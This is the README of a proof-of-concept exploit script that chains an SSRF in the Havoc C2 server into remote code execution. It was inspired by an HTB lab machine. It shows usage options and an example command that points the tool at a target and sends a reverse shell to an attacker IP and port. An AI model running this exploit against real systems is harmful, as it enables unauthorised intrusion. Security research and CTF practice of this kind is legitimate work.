# Havoc SSRF RCE PoC

Havoc RCE via SSRF.
Inspired by the HTB machine Backfire and the [havoc SSRF PoC](https://github.com/chebuya/Havoc-C2-SSRF-poc) by chebuya

Help:
```bash
usage: havoc_ssrf.py
[-h] --help   exploit help
-t --target   target host in url format es. https://192.168.1.10/
-i --ip    The IP to open the socket with (internal IP like 127.0.0.1)
-p --port    The port to open the socket with (internal port, usually 40056)
[-A USER_AGENT]    User agent to use for packets  (for havoc dashboard)
[-H --hostname]    Hostname of Windows machine to use  (for havoc dashboard) 
[-u --username]   username of spoofed agent (for havoc dashboard)
[-d --domain-name]   domain of the fake connection (for havoc dashboard)
[-n --process-name]  process name of the beacon  (for havoc dashboard)
[-ip --internal-ip]  internal ip of the havoc server
-a --attacker-ip      ip of the attacker's revshell listener
-ap --attacker-port       attacker port for revshell connection
-hu --HAVOC-USER    havoc user to perform login to the dashboard and launch exploit
-hp --HAVOC-PASSWORD  havoc password to login to the dashboard
```

example usage:
```bash
python3 havoc_ssrf.py --target https://192.168.1.100 -i 127.0.0.1 -p 40056 --attacker-ip 10.10.10.15 -ap 4444 -hu 'havoc_user' -hp 'HavoCpAssworD!'
```
